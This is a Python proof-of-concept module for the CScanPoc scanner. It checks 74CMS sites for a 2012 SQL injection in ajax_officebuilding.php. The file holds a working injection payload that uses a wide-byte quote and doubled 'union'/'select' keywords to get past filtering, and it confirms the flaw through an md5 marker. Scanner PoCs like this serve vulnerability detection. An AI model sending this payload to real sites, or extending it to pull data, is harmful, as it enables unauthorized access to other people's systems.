# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = '74cms_0007' # 平台漏洞编号，留空
    name = '74CMS 人才系统注入全版本通杀进后台漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2012-08-04'  # 漏洞公布时间
    desc = '''
        74CMS 人才系统注入全版本通杀进后台漏洞
    ''' # 漏洞描述
    ref = 'https://www.secpulse.com/archives/9713.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '74cms'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9a16771b-0d35-422d-a264-f7fe93bffbb5'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            code,res, _ = hh.http(url + "/plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"
                   "%201,2,3,md5(7836457),5,6,7,8,9%23")
                       
            if code == 200:
                if "3438d5e3ead84b2effc5ec33ed1239f5" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()